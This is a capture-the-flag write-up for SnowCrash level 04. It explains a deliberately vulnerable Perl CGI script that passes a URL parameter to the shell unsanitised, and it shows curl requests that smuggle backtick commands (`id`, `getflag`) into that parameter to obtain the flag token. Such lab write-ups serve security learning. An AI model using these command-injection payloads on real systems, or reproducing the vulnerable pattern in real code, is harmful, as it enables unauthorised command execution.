# Level 04

Level 04 contains a simple perl script on the home folder:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

on the first line we can see that the script  runs on port `4747`, it takes a parameter `x` and passes it to the function `x` which executes it as a shell command, the output of the command is then printed to the screen. One look at the script we can instantly spot the vulnerability at this line

```perl
print `echo $y 2>&1`;
```

As it passes the parameter `x` directly to the shell without any sanitization, this means that we can execute arbitrary commands by passing them as the parameter `x`

```bash
level04@SnowCrash:~$ curl 'localhost:4747/?x=`id`'
uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
```

and it works ! we can now use this vulnerability to get the token

```bash
level04@SnowCrash:~$ curl 'localhost:4747/?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```



